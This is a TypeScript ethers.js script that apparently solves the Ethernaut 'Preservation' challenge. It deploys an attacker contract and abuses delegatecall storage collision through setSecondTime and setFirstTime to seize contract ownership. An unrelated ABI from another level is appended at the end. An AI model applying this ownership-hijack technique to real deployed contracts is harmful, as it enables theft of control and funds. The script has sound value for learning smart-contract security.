// Runtime Environment's members available in the global scope.
import { ethers } from 'ethers';
import { BigNumber, Signer, BytesLike } from "ethers";
import { getSigner } from "./signer";
import { Preservation__factory } from "../typechain/ethers-v5";
import { PreservationAttacker__factory } from "../typechain";

async function main() {
  const instanceAddress = "0x07225EaBC5730c781c7FAbe8B29D83D58Ef32A58";
  const signer = getSigner();
  const target = Preservation__factory.connect(instanceAddress, signer);
  await target.deployed();

  const ownerAddress = await signer.getAddress();
  console.log("target owner:", await target.owner());
  console.log("ownerAddress:", ownerAddress);
  console.log("current lib 1:", await target.timeZone1Library());
  console.log("current lib 2:", await target.timeZone2Library());
  
  const attacker = await (new PreservationAttacker__factory(signer)).deploy();
  // const attacker = await (new PreservationAttacker__factory(signer)).attach("0xB0b561D951D08ae7b56d65141B18Ed3155853CaF");
  await attacker.deployed();
  console.log("attacker:", attacker.address);
  console.log("attack data:", BigNumber.from(attacker.address));

  // I do not know why call second function not work. But call first function work.
  await (await target.setSecondTime(BigNumber.from(attacker.address))).wait();
  // await (await target.setFirstTime(BigNumber.from(attacker.address))).wait();

  console.log("current lib 1:", await target.timeZone1Library());
  console.log("current lib 2:", await target.timeZone2Library());

  console.log("attack again to give new owner");
  console.log(BigNumber.from(ownerAddress));
  await (await target.setFirstTime(BigNumber.from(ownerAddress))).wait();

  console.log("owner:", await target.owner());
}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [
  {
    "inputs": [
      {
        "internalType": "bytes32[3]",
        "name": "_data",
        "type": "bytes32[3]"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "ID",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xb3cea217"
  },
  {
    "inputs": [],
    "name": "locked",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xcf309012"
  },
  {
    "inputs": [
      {
        "internalType": "bytes16",
        "name": "_key",
        "type": "bytes16"
      }
    ],
    "name": "unlock",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xe1afb08c"
  }
]